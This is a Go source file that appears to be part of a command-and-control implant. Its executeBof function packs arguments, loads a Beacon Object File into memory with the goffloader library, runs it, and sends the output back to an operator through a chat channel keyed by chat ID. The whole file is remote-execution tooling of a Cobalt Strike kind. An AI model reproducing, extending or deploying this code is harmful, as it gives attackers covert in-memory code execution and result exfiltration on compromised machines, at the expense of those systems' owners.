//go:build bof

package main

import (
	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
)

func executeBof(chatID int64, bofBytes []byte, bofArgs []string) {

	if len(bofArgs) == 1 && bofArgs[0] == "" {
		bofArgs = []string{}
	}
	// Note that args need to be prefaced with their type string as expected in aggressor scripts
	argBytes, err := lighthouse.PackArgs(bofArgs)
	if err != nil {
		SendMessage(chatID, "Could not pack BOF arguments")
		return
	}
	output, err := coff.Load(bofBytes, argBytes)
	if err != nil {
		SendMessage(chatID, "Could not load BOF")
		return
	}
	SendMessage(chatID, output)
}
